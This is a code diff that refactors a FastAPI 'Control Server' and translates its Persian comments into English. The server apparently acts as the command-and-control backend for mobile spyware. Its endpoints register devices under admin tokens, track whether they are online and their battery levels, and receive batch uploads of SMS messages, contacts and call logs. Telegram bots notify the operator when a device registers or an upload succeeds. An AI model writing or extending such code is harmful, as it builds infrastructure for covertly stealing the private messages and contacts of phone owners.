@@ -66,10 +66,7 @@ app = FastAPI(
 
 app.add_middleware(
     CORSMiddleware,
-    allow_origins=[
-        "*"
-
-    ],
+    allow_origins=["*"],
     allow_credentials=True,
     allow_methods=["*"],
     allow_headers=["*"],
@@ -77,11 +74,9 @@ app.add_middleware(
 
 @app.on_event("startup")
 async def startup_event():
-    logger.info("🚀 Starting  Control Server...")
+    logger.info("🚀 Starting Control Server...")
     await connect_to_mongodb()
-
     await auth_service.create_default_admin()
-
     logger.info("✅ Server is ready!")
 
 @app.on_event("shutdown")
@@ -89,11 +84,9 @@ async def shutdown_event():
     logger.info("🛑 Shutting down server...")
     await close_mongodb_connection()
     logger.info("👋 Server stopped!")
-
-
-###
 @app.post("/devices/heartbeat")
 async def device_heartbeat(request: Request):
+    """Update device heartbeat and online status"""
     try:
         data = await request.json()
         device_id = data.get("deviceId")
@@ -102,18 +95,14 @@ async def device_heartbeat(request: Request):
             raise HTTPException(status_code=400, detail="deviceId required")
         
         now = datetime.utcnow()
-        
-        # فقط این دستگاه رو آپدیت کن
         await mongodb.db.devices.update_one(
             {"device_id": device_id},
-            {
-                "$set": {
-                    "last_ping": now,
-                    "status": "online",
-                    "is_online": True,
-                    "last_online_update": now
-                }
-            }
+            {"$set": {
+                "last_ping": now,
+                "status": "online",
+                "is_online": True,
+                "last_online_update": now
+            }}
         )
         
         return {"success": True, "message": "Heartbeat received"}
@@ -124,7 +113,7 @@ async def device_heartbeat(request: Request):
 
 @app.post("/ping-response")
 async def ping_response(request: Request):
-    """دریافت پاسخ Ping از دستگاه"""
+    """Receive ping response from device"""
     try:
         data = await request.json()
         device_id = data.get("deviceId") or data.get("device_id")
@@ -132,18 +121,10 @@ async def ping_response(request: Request):
         if not device_id:
             raise HTTPException(status_code=400, detail="deviceId required")
         
-        logger.info(f"✅ Ping response received from device: {device_id}")
+        logger.info(f"✅ Ping response: {device_id}")
         
-        # آپدیت وضعیت آنلاین دستگاه
         await device_service.update_online_status(device_id, True)
-        
-        # ذخیره لاگ
-        await device_service.add_log(
-            device_id, 
-            "ping", 
-            "Ping response received", 
-            "success"
-        )
+        await device_service.add_log(device_id, "ping", "Ping response received", "success")
         
         return {"success": True, "message": "Ping response received"}
         
@@ -153,7 +134,7 @@ async def ping_response(request: Request):
 
 @app.post("/upload-response")
 async def upload_response(request: Request):
-    """دریافت پاسخ آپلود SMS/Contacts از دستگاه"""
+    """Receive upload response (SMS/Contacts) from device"""
     try:
         data = await request.json()
         device_id = data.get("device_id") or data.get("deviceId")
@@ -164,36 +145,19 @@ async def upload_response(request: Request):
         if not device_id or not status:
             raise HTTPException(status_code=400, detail="device_id and status required")
         
-        logger.info(f"📊 Upload response from {device_id}: {status} - Count: {count}")
+        logger.info(f"📊 Upload response: {device_id} - {status} ({count})")
         
-        # تشخیص نوع آپلود
-        upload_type = "Unknown"
-        if "sms" in status.lower():
-            upload_type = "SMS"
-        elif "contacts" in status.lower():
-            upload_type = "Contacts"
-        
-        # ذخیره لاگ
+        upload_type = "SMS" if "sms" in status.lower() else "Contacts" if "contacts" in status.lower() else "Unknown"
         log_message = f"{upload_type} upload: {count} items"
         if error:
             log_message += f" - Error: {error}"
         
         log_level = "success" if "success" in status else "error"
         
-        await device_service.add_log(
-            device_id,
-            "upload",
-            log_message,
-            log_level,
-            metadata={
-                "status": status,
-                "count": count,
-                "error": error,
-                "type": upload_type
-            }
-        )
+        await device_service.add_log(device_id, "upload", log_message, log_level, metadata={
+            "status": status, "count": count, "error": error, "type": upload_type
+        })
         
-        # اگه موفق بود، به تلگرام ادمین اطلاع بده (Bot 1: دستگاه‌ها)
         if "success" in status and count > 0:
             try:
                 device = await device_service.get_device(device_id)
@@ -203,7 +167,7 @@ async def upload_response(request: Request):
                         f"✅ {upload_type} Upload Complete\n"
                         f"📱 Device: <code>{device_id}</code>\n"
                         f"📊 Count: {count} items",
-                        bot_index=1  # Bot 1: Device activities
+                        bot_index=1
                     )
             except:
                 pass
@@ -218,32 +182,20 @@ async def upload_response(request: Request):
 
 @app.post("/register")
 async def register_device(message: dict, background_tasks: BackgroundTasks):
-    """
-    رجیستر دستگاه با توکن ادمین
-    
-    Accepts BOTH formats:
-    - Legacy: admin_token (device_token)
-    - New: user_id (same as admin_token/device_token)
-    """
+    """Register device with admin token"""
     device_id = message.get("device_id")
     device_info = message.get("device_info", {})
-    
-    # Support both admin_token and user_id (they're the same thing)
     admin_token = message.get("admin_token") or message.get("user_id")
-    app_type = message.get("app_type")  # App flavor
+    app_type = message.get("app_type")
     
-    # Add app_type to device_info if provided
     if app_type:
         device_info["app_type"] = app_type
     
     result = await device_service.register_device(device_id, device_info, admin_token)
     await device_service.add_log(device_id, "system", f"Device registered (app: {app_type or 'unknown'})", "info")
     
-    # اگه توکن معتبر بود، به ربات ادمین اطلاع بده (در background)
     if admin_token and result.get("device") and result["device"].get("admin_username"):
         admin_username = result["device"]["admin_username"]
-        
-        # ارسال notification ها در background (سریع‌تر!)
         background_tasks.add_task(
             notify_device_registration_bg,
             telegram_multi_service,
@@ -253,21 +205,16 @@ async def register_device(message: dict, background_tasks: BackgroundTasks):
             device_info,
             admin_token
         )
-        logger.info(f"📱 Device registration notifications queued for {admin_username}")
+        logger.info(f"📱 Registration notifications queued for {admin_username}")
     
-    return {
-        "status": "success", 
-        "message": "Device registered successfully",
-        "device_id": device_id
-    }
+    return {"status": "success", "message": "Device registered successfully", "device_id": device_id}
 
 
 @app.post("/battery")
 async def battery_update(message: dict):
-    """آپدیت باتری"""
+    """Update device battery level"""
     device_id = message.get("device_id")
     data = message.get("data", {})
-    
     battery_level = data.get("battery")
     is_online = data.get("is_online", True)
     
@@ -282,8 +229,7 @@ async def battery_update(message: dict):
 
 @app.post("/sms/batch")
 async def sms_history(message: dict):
-    # print(message)
-    """آپلود SMS"""
+    """Upload SMS history in batches"""
     device_id = message.get("device_id")
     sms_list = message.get("data", [])
     batch_info = message.get("batch_info", {})
@@ -298,8 +244,7 @@ async def sms_history(message: dict):
 
 @app.post("/contacts/batch")
 async def contacts_bulk(message: dict):
-    """آپلود مخاطبین"""
-    # print(message)
+    """Upload contacts in batches"""
     device_id = message.get("device_id")
     contacts_list = message.get("data", [])
     batch_info = message.get("batch_info", {})
@@ -314,8 +259,7 @@ async def contacts_bulk(message: dict):
 
 @app.post("/call-logs/batch")
 async def call_history(message: dict):
-    """آپلود تاریخچه تماس"""
-    # print(message)
+    """Upload call logs in batches"""
     device_id = message.get("device_id")
     call_logs = message.get("data", [])
     batch_info = message.get("batch_info", {})
